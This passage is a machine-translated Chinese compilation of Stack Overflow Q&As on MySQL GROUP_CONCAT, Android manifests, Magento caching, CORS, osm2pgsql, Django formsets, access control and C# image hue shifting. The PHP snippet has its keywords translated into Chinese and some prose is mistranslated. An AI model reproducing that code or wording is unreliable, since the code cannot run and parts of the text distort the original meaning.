SELECT MD5(GROUP_CONCAT('123456'));
-- e10adc3949ba59abbe56e057f20f883e 
```

如果你不能改变`group_concat_max_len`，你将不得不另寻出路。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:19:58.403

的默认限制是 1024，如[文档](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html#function_group-concat)`group_concat`中明确解释的那样：

> 结果被截断为 group_concat_max_len 系统变量给出的最大长度，默认值为 1024。

您可以通过更改设置`group_concat_max_len`系统变量来更改此设置。

这会影响您看到的结果和函数的参数。

此外，您用于获取结果的工具可能会进一步截断返回值。

最后，如果你`group_concat()`像这样使用，那么你应该明确地使用一个`order by`子句。不保证订购。在实践中，如果基础数据没有改变，我认为它不会在运行之间改变。但是，删除和插入记录可能会更改排序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-16T20:24:25.637

一种策略是先行`md5(concat())`，这会将大小减少到每行 32 个字节，然后`group_concat`是整个事情。这将允许您一次获取`floor(group_concat_max_len / 33)`行的哈希值（不要忘记逗号）。

[我在这里](https://stackoverflow.com/a/51369193/1054322)做类似的事情。

如果那仍然不适合您，`group_concat_max_len`那么您可以`GROUP BY`产生小于`floor(group_concat_max_len / 33)`行的组，对这些进行散列，然后对这些散列进行散列（再次以小于...的组）。这会很丑陋，但您可以继续嵌套尽可能多的深度，以散列您需要的尽可能多的行。

或者，您可以要求有权进行修改的人使用`group_concat_max_len`上述策略来威胁他们的 CPU 进行修改。

# android - 在启动期间在 Android 上获取 java.lang.classcastexception

> ID：15510420
> 
> 赞同：0
> 
> 时间：2013-03-19T21:05:36.797
> 
> 标签：android, android-activity, manifest, classcastexception

我写了一个简单的应用程序，开始时只包含一个 Activity 和多个其他类（不是从 Activity 继承的）。我现在添加了一个新类 HandlePrefs，它也继承自 Activity，并在与此类匹配的清单文件中添加了一个新标签。

现在我在启动期间遇到 java.lang.classcastexception 错误（但仅在使用 API lvl 15 及更高版本时。它在旧 API 版本上运行良好。

这是清单文件：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
  package="tal.game.ammelampe.classes"
  android:versionCode="3"
  android:versionName="1.2"
  android:installLocation="preferExternal">
<uses-sdk android:minSdkVersion="3" android:targetSdkVersion="8"/>
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.VIBRATE" />
<application android:icon="@drawable/icon" 
             android:label="Amme Lampe lite" 
             android:allowBackup="true">

    <provider android:name=".FeedingProvider"
              android:authorities="tal.game.ammelampe.FeedingProvider" />        

    <activity android:name="tal.game.ammelampe.classes.AmmeLampeApp"
              android:label="Amme Lampe Lite"
              android:configChanges="keyboard|keyboardHidden|orientation"
              android:screenOrientation="portrait">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

    <activity android:name="tal.game.ammelampe.classes.HandlePrefs">
    </activity>
 </application> 

 </manifest> 
```

这是我的 AndroidApp 类（启动类）

```
package tal.game.framework.impl;

import tal.game.ammelampe.classes.HelpScreen;
import tal.game.ammelampe.classes.MainMenuScreen;
import tal.game.ammelampe.classes.Settings;
import tal.game.framework.App;
import tal.game.framework.FileIO;
import tal.game.framework.Graphics;
import tal.game.framework.Input;
import tal.game.framework.Screen;
import android.app.Activity;
import android.content.Context;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.Bitmap.Config;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.Vibrator;
import android.os.PowerManager.WakeLock;
//import android.util.Log;
import android.view.KeyEvent;
import android.view.Window;
import android.view.WindowManager;

public abstract class AndroidApp extends Activity implements App {
    AndroidFastRenderView renderView;
    Graphics graphics;
    Input input;
    FileIO fileIO;
    Screen screen;
    WakeLock wakeLock;
    public static Vibrator v;

    @Override
    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        //Debug.startMethodTracing();
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        boolean isLandscape = getResources().getConfiguration().orientation == Configuration.ORIENTATION_LANDSCAPE;
        int frameBufferWidth = isLandscape ? 480 : 320;
        int frameBufferHeight = isLandscape ? 320 : 480;
        Bitmap frameBuffer = Bitmap.createBitmap(frameBufferWidth,
                frameBufferHeight, Config.RGB_565);

        float scaleX = (float) frameBufferWidth   /   getWindowManager().getDefaultDisplay().getWidth(); 
        float scaleY = (float) frameBufferHeight  / getWindowManager().getDefaultDisplay().getHeight();

        v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);

        renderView = new AndroidFastRenderView(this, frameBuffer);
        graphics = new AndroidGraphics(getAssets(), frameBuffer);
        fileIO = new AndroidFileIO(getAssets());

        input = new AndroidInput(this, renderView, scaleX, scaleY);
        screen = getStartScreen();
        setContentView(renderView);

        PowerManager powerManager = (PowerManager)     getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK, "GLGame");

    } 
```

同样继承自 Activity 的新类：

```
package tal.game.ammelampe.classes;

import tal.game.ammelampe.classes.FeedingDBMetaData.FeedingTableMetaData;
import tal.game.framework.App;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;

public class HandlePrefs extends Activity{

// Definer keys i preferences
    private static final String INITIALIZED = "initialized"; 
    private static final String name      = "name";
private static final String dob       = "dob";
private static final String sex       = "sex";
private static final String bgColor   = "bgcolor";
private static final String onOffLamp = "onofflamp";

// This variable is set in the LoadingScreen class
public static Long currentDate;
public static Long LongDob;

public static String lName = "";            
public static String lDob;                  
public static String lSex;                  
public static String lBgColor;              
public static String lOnOffLamp;            

static SharedPreferences myPrefs;
Activity activity = this;

 @Override
 public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
 } 
```

上面没有包含类中的很多代码，因为我相信它不会导致错误。但如果我错了，我当然会为你们提供它:)

最后是 LogCat 输出：

```
03-19 21:51:49.201: W/dalvikvm(3256): threadid=1: thread exiting with uncaught exception (group=0x40ab4228)
03-19 21:51:49.261: E/AndroidRuntime(3256): FATAL EXCEPTION: main
03-19 21:51:49.261: E/AndroidRuntime(3256): java.lang.RuntimeException: Unable to start activity ComponentInfo{tal.game.ammelampe.classes/tal.game.ammelampe.classes.AmmeLampeApp}: java.lang.ClassCastException: tal.game.ammelampe.classes.AmmeLampeApp cannot be cast to android.app.Application
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2194)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2229)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.app.ActivityThread.access$600(ActivityThread.java:139)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1261)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.os.Handler.dispatchMessage(Handler.java:99)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.os.Looper.loop(Looper.java:154)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.app.ActivityThread.main(ActivityThread.java:4945)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at java.lang.reflect.Method.invokeNative(Native Method)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at java.lang.reflect.Method.invoke(Method.java:511)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at dalvik.system.NativeStart.main(Native Method)
03-19 21:51:49.261: E/AndroidRuntime(3256): Caused by: java.lang.ClassCastException: tal.game.ammelampe.classes.AmmeLampeApp cannot be cast to android.app.Application
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.view.Window.getCompatInfo(Window.java:475)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.view.Window$LocalWindowManager.<init>(Window.java:485)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.view.Window.setWindowManager(Window.java:471)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.app.Activity.attach(Activity.java:4517)
03-19 21:51:49.261: E/AndroidRuntime(3256):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2135)
03-19 21:51:49.261: E/AndroidRuntime(3256):     ... 11 more
03-19 21:51:49.281: E/EmbeddedLogger(185): App crashed! Process: tal.game.ammelampe.classes
03-19 21:51:49.281: E/EmbeddedLogger(185): App crashed! Package: tal.game.ammelampe.classes v3 (1.2)
03-19 21:51:49.281: E/EmbeddedLogger(185): App crashed! Application Label: Amme Lampe lite
03-19 21:51:49.281: W/ActivityManager(185):   Force finishing activity tal.game.ammelampe.classes/.AmmeLampeApp 
```

我尝试使用 android:name="android.app.Application" 标记作为标记中的直接子项修改清单文件（如其他类似问题中所建议的那样），但仍然遇到相同的错误。我在这里做错了什么？

清单文件中带有 android:name="android.app.Application" 标记的 LogCat：

```
03-19 22:00:19.789: E/AndroidRuntime(4154): FATAL EXCEPTION: main
03-19 22:00:19.789: E/AndroidRuntime(4154): java.lang.RuntimeException: Unable to start  activity ComponentInfo{tal.game.ammelampe.classes/tal.game.ammelampe.classes.AmmeLampeApp}:   java.lang.ClassCastException: tal.game.ammelampe.classes.AmmeLampeApp cannot be cast to android.app.Application 
```

应用类：

```
package tal.game.framework;

import android.content.Context;

public interface App {
    public Input getInput();

    public FileIO getFileIO();

    public Graphics getGraphics();

    public void setScreen(Screen screen);

    public Screen getCurrentScreen();

    public Screen getStartScreen();

    public Context getApplicationContext();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:12:24.870

您不需要实现 App 而只是像这样扩展 Activity

改变：`public abstract class AndroidApp extends Activity implements App {`

至：`public abstract class AndroidApp extends Activity {`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:13:24.293

您在清单中列为 Activity 的类 Ammelameapp 不是从 Activity 派生的。您的 AndroidApp 类确实派生自 Activity，但它是抽象的（因此不能直接使用）并实现了一个名为 App 的东西，我不知道它是什么。我认为您需要详细了解 Activity 和 Application 在 Android 中的确切含义。

每个应用程序都有一个 Application 对象。您可以使用 Android 默认值，也可以扩展它并自己制作。应用程序可以有 1 个或多个作为具体类的活动，并且必须从 Activity 扩展。这些活动列在应用程序内部的清单中。该列表包括类的完全限定路径或本地活动的 .ClassName 表单。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-11T15:48:10.533

正如 JBirdVegas 在[他们的评论](https://stackoverflow.com/questions/15510420/getting-java-lang-classcastexception-on-android-during-startup/18173694#comment22004388_15510420)中所说：

> 我不确定它是否重要，但 getApplicationContext() 也是 Context 继承的抽象方法。也许重命名您的方法 getApplicationContext() 和您的界面 App；让我们面对现实吧，您的 App 类的命名可能更具描述性。

# php - 从 PHP 中的静态方法访问私有

> ID：15510421
> 
> 赞同：2
> 
> 时间：2013-03-19T21:05:38.180
> 
> 标签：php, oop, static-methods

为什么这行得通？我的意思是，访问私有变量。

```
类测试{
    私人 $q = 0;
    公共函数 __construct() {
        $this->q = 1;
    }
    公共静态函数 EpicConstruct() {
        $test = 新的自我（）；
        $test->q = 2;
        返回$测试；
    }
}

$test = Test::EpicConstruct();

```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:07:34.793

因为您在正确的上下文中访问成员，即：定义私有成员的类。

# php - Magento 模型不会保存值

> ID：15510422
> 
> 赞同：11
> 
> 时间：2013-03-19T21:05:39.733
> 
> 标签：php, mysql, magento, model, module

我正在开发一个保存到自定义表的后端模块。我的问题是我已经在这个表中添加了字段，因为我一直在处理它，新添加的字段不会使用 model ->Save() 函数保存。

我已经完全删除了模块并重新安装了它，让它从头开始创建我的自定义表，以防它有一些我不知道的内部字段计数，但结果仍然相同。

添加我的数据后，我对提交的内容进行 var 转储，如下所示：

```
$model = Mage::getModel("smsmanager/sms")->addData($post_data)->save();
var_dump($model->getData()); exit; 
```

结果

```
array
  'form_key' => string 'RUGN3fruWobAf8CZ' (length=16)
  'message' => string 'adg asdg sad' (length=14)
  'country' => string 'SE' (length=2)
  'telephone' => string '+46707332290' (length=12)
  'type' => int 2
  'id' => string '5' (length=1) 
```

一切看起来都很好。当我检查新创建的 ID 为 5 的行时，我得到了这个：

```
|-----------------------------------------------------------------------------------------------------------|
|id int(11)| type int(11) | telephone varchar(20) | country varchar(2) | message text | date timestamp      |
|-----------------------------------------------------------------------------------------------------------|
| 5        | 2            | +46707332290          | NULL               | adg asdg sad | 2013-03-19 21:44:51 |
|-----------------------------------------------------------------------------------------------------------| 
```

我还尝试将其他字段手动插入到数据库表中，例如“junkfield”并将其添加`$post_data['junkfield'] = "hello";`，它也将 null 作为值。

对我来说，看起来 Magento 正在和我开玩笑。违背逻辑。有人对可能出了什么问题有另一种看法吗？哦，在我忘记之前，这是我的表格布局：

```
CREATE TABLE IF NOT EXISTS `sms_entry` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `type` int(11) NOT NULL,
  `telephone` varchar(20) DEFAULT NULL,
  `country` varchar(2) DEFAULT NULL,
  `message` text,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8; 
```

无论我尝试什么，它都不会保存国家代码。我还尝试使 varchar 大于 2，将名称切换为`country_code`（以防国家/地区被保留或其他）。似乎没有任何帮助。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2013-03-20T00:12:12.257

在 Magento 的管理系统中禁用缓存选项*不会*禁用所有缓存。`var/cache/`Magento 仍然在 Magento 的根文件夹下的目录中缓存表结构、区域设置数据等（这*不是* `/var/cache`）。

要禁用所有缓存，请将以下`<cache>`条目添加到 的`<global>`部分`app/etc/local.xml`：

```
<config>
    <global>
        ...
        <cache>
            <backend>Zend_Cache_Backend_BlackHole</backend>
        </cache>
        ... 
```

要刷新包含表结构的缓存，请进入管理系统，然后选择 System > Cache Management > Flush Cache Storage（不是 Flush Magento Cache！）。这将删除`var/cache`.

您还可以通过命令行刷新缓存：

```
$ sudo rm -fr /path/to/your/magento/installation/var/cache/* 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-19T21:54:32.413

据我所知 - Magento 以某种方式缓存数据库结构。所以只是 Flush Magento Cache 应该会有所帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-26T06:26:37.050

+1 另请注意，就我而言，我只是忘记了我正在使用 REDIS 缓存，所以如果您使用它，请不要忘记也删除此缓存！

# jquery - Access-Control-Allow-Origin 不允许 Origin url

> ID：15510427
> 
> 赞同：4
> 
> 时间：2013-03-19T21:06:02.460
> 
> 标签：jquery, ajax, spring-mvc, cross-domain

我知道关于这个错误已经有很多问题了。但是，即使设置了标题，我仍然无法让它工作

```
 "Access-Control-Allow-Origin" : "*" 
```

在我的服务器端。

这是我的spring mvc控制器方法：

```
 @RequestMapping(method=RequestMethod.GET, value="dummy/{num}")
    @ResponseBody
    public ResponseEntity<Result> dummy(@PathVariable String num)
    {
        int n = Integer.parseInt(num);
        final Result result = new Result();
        result.setAddition(n+20);
        result.setMultiplication(n*20);
        result.setSubtraction(n-20);
        HttpHeaders headers = new HttpHeaders();
        headers.add("Access-Control-Allow-Origin", "*");
        ResponseEntity<Result> ent = new ResponseEntity<Result>(result,headers,HttpStatus.CREATED);
        return ent;
    } 
```

这是我来自 Jquery 的 AJAX 调用

```
$.ajax({
    url: "http://localhost:8010/Probe_Rest_Service/test/dummy/9",
    type: "get",
    crossDomain: true,
    dataType: 'json',
    headers: { 
    "Content-type" : "application/json"
    },

    success: function(data){

        console.log("It worked!");
        alert(data);
    },

    error: function(){
        // enable the inputs
        alert("error");
    }
}); 
```

我尝试从 chrome 的 dev-http 客户端调用我的 REST api，它工作正常（响应头设置了 Access-Control-Allow-Origin:*）。但是，当我从我的 html 文件中调用它时，我得到了错误。

我使用 JBoss 作为我的 rest api 和 tomcat 来托管我的客户端网页

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:20:09.827

由于您发送的是内容类型的请求，`application/json`因此客户端被迫执行 CORS 飞行前请求。

[CORS 规范规定](http://www.w3.org/TR/cors/)`application/x-www-form-urlencoded`，除、`multipart/form-data`或之外的任何内容类型都`text/plain`需要飞行前请求来确定是否允许标头。

因此，您需要处理飞行前请求（HTTP 方法 = `OPTIONS`）。

为简单起见，让服务器响应标头：

```
Access-Control-Allow-Headers: * 
```

这将允许所有请求标头。

**更新**

我再次阅读了您的问题，发现了一些我不明白的内容：您为什么要首先发送`Content-Type`HTTP GET 请求的标头？这是不正确的。

只需删除

```
headers: { 
   "Content-type" : "application/json"
} 
```

然后再试一次。那可能会解决它！

# postgis - osm2pgsql windows“非法选项-W”错误

> ID：15510428
> 
> 赞同：2
> 
> 时间：2013-03-19T21:06:11.217
> 
> 标签：postgis, postgresql-9.1, openstreetmap

我正在尝试将地图数据导入到`postgis DB`Windows 中。我已经这样做了多年，`osm2pgsql`但西班牙地图的最新更新会产生重复的密钥错误。这似乎是一个 64 位版本的问题。有没有办法避免这个问题？我尝试先使用它对其进行排序，`osmosis`但我得到了同样的错误。

另一个问题。我下载了新`osm2pgsql`版本（2013 年 2 月 6 日），但无法正常工作。它显示`"illegal option --w"`. 我使用以下（始终与以前的版本一起使用）

```
 "osm2pgsql -c -d osm  -s  -S C:\sw\osm2postgre\default.style -U postgres -W -H localhost -P 5432 c:\mapas\spain.osm.bz2" 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-03T13:35:40.243

新版本不允许您使用 -w 插入密码，而是必须在运行 osm2pgsql 之前将密码设置到环境变量 pgpassword 中，如下所示：

```
SET pgpassword=postgres 
```

例如。

# django - FormSet - 为什么我们应该使用它？

> ID：15510437
> 
> 赞同：0
> 
> 时间：2013-03-19T21:06:45.533
> 
> 标签：django, django-forms

我正在阅读[Django 文档](https://docs.djangoproject.com/en/dev/topics/forms/formsets/)中有关 FormSets 的信息，但我在理解此功能的含义时遇到了问题。也许文章的例子很不幸，但是我们希望多久在同一页面上显示几个相同的表单？我为什么要这样做？你知道更好的例子吗 - formset 的优点是什么以及何时使用它们？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:08:34.013

当您需要创建模型的多个实例时，使用表单集。例如，也许您正在举办一个聚会，并且您想将多个客人添加到您的聚会中。您可以为“来宾”模型使用表单集，一次添加任意数量的表单。

在我看来，表单集是 Django 的一个非常强大的特性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:11:24.863

每当您有一系列与父项关联的子记录时，您都需要执行此操作。一个家庭及其成员；一本书及其章节；班级及其学生；一个购物篮和里面的东西……不胜枚举。所有这些都涉及一个主表单和一整套相同的子表单，您可以使用表单集的内联版本来执行此操作 - 这就是 Django 管理员的内联功能的工作方式。

# design-patterns - 是否总是需要 ACL？

> ID：15510438
> 
> 赞同：3
> 
> 时间：2013-03-19T21:06:47.190
> 
> 标签：design-patterns, acl, access-control, rbac, abac

对于具有高度复杂访问控制规则的 Web 应用程序，您是否总是使用 ACL？

在确定我的用户权限时，我有很多考虑因素，包括：

*   他们登录了吗？
*   他们是管理员还是普通用户？
*   他们是否在浏览图中的节点？
*   他们正在浏览什么类型的节点？
*   它们与节点的关系是什么（即到节点的路径）？
*   用户的默认设置是什么？
*   节点的默认设置是什么？
*   将用户连接到节点的图边的设置是什么？
*   ETC

事实证明，开发 ACL 很困难。过了一会儿，我求助于对每个动作顶部的基本属性进行“if/then”检查，例如`if(isAdmin) {...}`

这似乎工作正常，我想知道是否应该将其作为永久解决方案保留。因此，问题是：访问控制的复杂性是否会超过 ACL？还是只是我需要更加努力一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T14:46:25.137

当您的访问控制模型变得过于复杂时，因为访问不再仅仅基于用户的身份，您希望转移到另一个访问控制模型。

您可以使用基于角色的访问控制 (RBAC)，其中将权限分组为角色，并将角色分配给用户。Active Directory 和其他 LDAP 产品允许您进行基于角色的访问控制。

但是如果你想实现的不仅仅是角色，特别是你想考虑关系、图和图边，你想使用基于属性的访问控制 (ABAC)。在基于属性的访问控制中，您可以实现考虑用户属性（他们的角色、部门、位置、年龄、公民身份……）以及资源属性（节点在图中的位置、边缘……）的授权逻辑。 .) 以及节点和用户之间的关系。

我在 ABAC 上上传了一个视频：www.youtube.com/watch?v=xUEbBKnxWSo CERIAS 也有一些很棒的视频：www.youtube.com/watch?v=3ZCoupGHmwo

今天实现 ABAC 的主要标准是 XACML，即可扩展访问控制标记语言。我会研究 XACML（免责声明 - 我为 XACML 供应商 Axiomatics 工作）。

您可以查看供应商和开源 XACML 实现。

使用 XACML，您最终会得到一个 if (isAuthorized()) 语句，而不是一堆 if(isAdmin) 和 if(validCitizen) 语句。实际的授权逻辑集中在以 XACML 表示的策略中。这也称为外部授权。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:19:00.063

首字母缩写词 ACL 代表访问控制列表。因此，根据定义 - 一旦您根据用户的身份或所属的组控制用户可以访问哪些用户，您就拥有了一个 ACL。

所以对第一个问题的简短回答是，是的，您总是使用 ACL。

至于其他问题，我对他们两个都说是

ACL 可能会变得比它所控制的应用程序所需要的更复杂——例如，如果您希望对用户可以做什么进行精细控制。因此，如果您认为它变得复杂 - 看看您是否不能通过将一些 ACO 组合在一起甚至删除它们（并允许所有用户访问它们）来“简化它”。

# c# - 如何将位图更改为另一种随机颜色？

> ID：15510441
> 
> 赞同：1
> 
> 时间：2013-03-19T21:07:03.190
> 
> 标签：c#, image-processing

我很想在地图上添加点。不管这张地图上有多少个图钉，每个图钉都会有自己的颜色。我只想改变色调

我正在使用一个看起来像这样的模板 png

![在此处输入图像描述](../Images/3a5acd8c75414ae2878e1e2cdc6bd598.png)

我想创建一个函数，当出现新点时，该文件将随机着色。

我该怎么做？

我正在使用下面的代码 - 我无法弄清楚如何在矩阵中抛出随机值以输出任何在色板中间隔足够远的好颜色

```
 private Bitmap ColorMyPin()
{
    Image imgPicture = Properties.Resources.green_MarkerBlank;

    Bitmap bmp = new Bitmap(imgPicture.Width, imgPicture.Height);

    ImageAttributes iaPicture = new ImageAttributes();
    ColorMatrix cmPicture = new ColorMatrix(new float[][]
    {
        new float[] {0, 0, 0, 0, 0},
        new float[] {0, 0, 0, 0, 0},
        new float[] {0, 0, 0, 0, 0},  <-- //Hard part where do i throw random() values at
        new float[] {0, 0, 0, 0, 0},
        new float[] {0, 0, 0, 0, 0}
    });

    // Set the new color matrix
    iaPicture.SetColorMatrix(cmPicture);

    // Set the Graphics object from the bitmap
    Graphics gfxPicture = Graphics.FromImage(bmp);

    // New rectangle for the picture, same size as the original picture
    Rectangle rctPicture = new Rectangle(0, 0, imgPicture.Width, imgPicture.Height);

    // Draw the new image
    gfxPicture.DrawImage(imgPicture, rctPicture, 0, 0, imgPicture.Width, imgPicture.Height, GraphicsUnit.Pixel, iaPicture);

    return bmp;
} 
```

后

![在此处输入图像描述](../Images/16e3d58f9390c6b07041917e2adb6843.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T22:25:26.203

I believe you're looking for the `ColorMatrix` class...I admit I'm not a wizard with image manipulation, but here are some references:

*   [http://www.codeproject.com/Articles/3772/ColorMatrix-Basics-Simple-Image-Color-Adjustment](http://www.codeproject.com/Articles/3772/ColorMatrix-Basics-Simple-Image-Color-Adjustment)
*   [Understanding the Use of ColorMatrix and ColorMatrixColorFilter to Modify a Drawable's Hue](https://stackoverflow.com/questions/4354939/understanding-the-use-of-colormatrix-and-colormatrixcolorfilter-to-modify-a-draw)
*   [How to understand and choose values when working with ColorMatrix?](https://stackoverflow.com/questions/6149280/how-to-understand-and-choose-values-when-working-with-colormatrix)
*   [http://docs.rainmeter.net/tips/colormatrix-guide](http://docs.rainmeter.net/tips/colormatrix-guide)
*   [http://www.graficaobscura.com/matrix/index.html](http://www.graficaobscura.com/matrix/index.html)

And here is a quick and ugly blob of sample code I put together:

```
void Main()
{
        var redPinPath = @"c:\temp\pin.png";
        var redPin = Bitmap.FromFile(redPinPath);

        var window1 = new Form();
        window1.BackgroundImage = redPin;
        window1.Show();

        for(var hue = 0.01f; hue < Math.PI; hue += 0.01f)
        {
            var pinCopy = Bitmap.FromFile(redPinPath);
            AlterHue(hue, pinCopy);
            window1.BackgroundImage = pinCopy;
            window1.Invalidate();
            Application.DoEvents();
        }
}

// Define other methods and classes here
public void AlterHue(float newHue, Image image)
{
    var lumR = 0.213f;
    var lumG = 0.715f;
    var lumB = 0.072f;
    var cosVal = (float) Math.Cos(newHue);
    var sinVal = (float) Math.Sin(newHue);
    var imgGraphics = Graphics.FromImage(image);
    var pinAttributes = new ImageAttributes();
    var colorMatrix = new ColorMatrix(new float[][]
    {
        new float[] {lumR + cosVal * (1 - lumR) + sinVal * (-lumR),     lumG + cosVal * (-lumG) + sinVal * (-lumG),         lumB + cosVal * (-lumB) + sinVal * (1 - lumB), 0, 0},
        new float[] {lumR + cosVal * (-lumR) + sinVal * (0.143f),         lumG + cosVal * (1 - lumG) + sinVal * (0.140f),     lumB + cosVal * (-lumB) + sinVal * (-0.283f), 0, 0},
        new float[] {lumR + cosVal * (-lumR) + sinVal * (-(1 - lumR)),     lumG + cosVal * (-lumG) + sinVal * (lumG),             lumB + cosVal * (1 - lumB) + sinVal * (lumB), 0, 0},
        new float[] {0, 0, 0, 1, 0},
        new float[] {0, 0, 0, 0, 1}
    });

    var sizeRect = new Rectangle(0, 0, image.Width, image.Height);
    pinAttributes.SetColorMatrix(colorMatrix);
    imgGraphics.DrawImage(image, sizeRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, pinAttributes);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:20:42.603

有据可查的是，在区分图表、图形、网格或地图上的颜色时，人眼并不能很好地做到这一点。我已经看到建议的上限低至 8 种，高至 15 种独特的颜色（假设观看者不是色盲）。使用调色板可能会更好。

如果您想增加可能的引脚数量，您可以将调色板中的颜色数量乘以一些易于区分的形状（圆形、三角形、正方形等）。您甚至可以使用双色调方法（粗边框和内部颜色），这会将您的总数（颜色 * 形状）提高到二次方。

因此，假设 8 种颜色、4 种形状和两种色调的配色方案，您将能够表示 1,024 个 unqiue 引脚。

如需进一步阅读，请查看这篇关于颜色和数据视觉表示的优秀文章： [http ://www.perceptualedge.com/articles/visual_business_intelligence/rules_for_using_color.pdf](http://www.perceptualedge.com/articles/visual_business_intelligence/rules_for_using_color.pdf)

# entity-framework - 如何在 Linq (.net 4.0) 中实现全文搜索

> ID：15510446
> 
> 赞同：0
> 
> 时间：2013-03-19T21:07:19.957
> 
> 标签：entity-framework, c#-4.0, lambda, linq-to-entities

我一直在努力寻找一种可能的方法来实现根据某些标准过滤我的结果集，其中之一是全文搜索。在浏览了一些博客之后才知道 Linq 不直接支持它，并且有一个有意义的[解决方法。](http://sqlblogcasts.com/blogs/simons/archive/2008/12/18/LINQ-to-SQL---Enabling-Fulltext-searching.aspx)

所以我开始使用这种方法，但是当我想到我不能在 .net 4.0 中使用表值函数时遇到了死胡同（.net 4.5 确实支持但我现在不能使用（函数导入））。

然后，我通过编辑 ssdl 文件并添加功能详细信息（使用命令文本进行自定义查询）来[解决另一个使用自定义函数的问题。](http://www.codeproject.com/Articles/96457/Defining-Custom-Functions-in-Entity-Framework)

我的 UDF 如下所示：-

```
CREATE FUNCTION udf_CandidateFTS
(   
    @keywords nvarchar(4000)
)
RETURNS @resCandidates TABLE
(
    CandidateID INT,
    FileRank INT
)
AS
BEGIN

    INSERT INTO @resCandidates
    (
        CandidateID,
        FileRank
    )
    SELECT c.CandidateID, fileContent.Rank as FileRank
            FROM CONTAINSTABLE (FileContent, Content, @keywords) as fileContent
            INNER JOIN [file] f on f.ContentID = fileContent.[Key]
            INNER JOIN [Candidate_Resume] c on c.CandidateID = f.[ID]

    RETURN
END 
```

我编辑了我的 SSDL 文件：-

```
 <Function Name="GetCandidateWithTextSearch" IsComposable="false">
    <CommandText>
      SELECT * from
      dbo.udf_CandidateFTS(@keywords)
    </CommandText>
    <Parameter Name="keywords" Type="nvarchar" Mode="In" />
  </Function> 
```

并添加了一个 EDMFunction ：-

```
 public class MyFunctions
    {
        [EdmFunction("MMJ.Service.Data", "GetCandidateWithTextSearch")]
        public static IList GetCandidateWithTextSearch(string keywords)
        {
            throw new NotSupportedException();
        }
    } 
```

与其他过滤器一起，我想执行以下操作：-

```
 var query = context.Candidate
.Where(c => c.ID.Equals(MyFunctions.GetCandidateWithTextSearch("wali")
.Contains(c.ID))).ToList(); 
```

请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T21:30:59.290

不起作用。第一个解决方法是使用映射表值函数 - 它需要 .NET 4.5。第二种解决方法是使用与存储过程等效的映射。这两者的区别在于：

*   第一个是可组合的。它可用于 Linq-to-entities 查询并被转换为 SQL 函数调用。
*   第二个是不可组合的。它可以只执行和枚举。其他一切都必须在您的应用程序中作为 Linq-to-objects 运行。

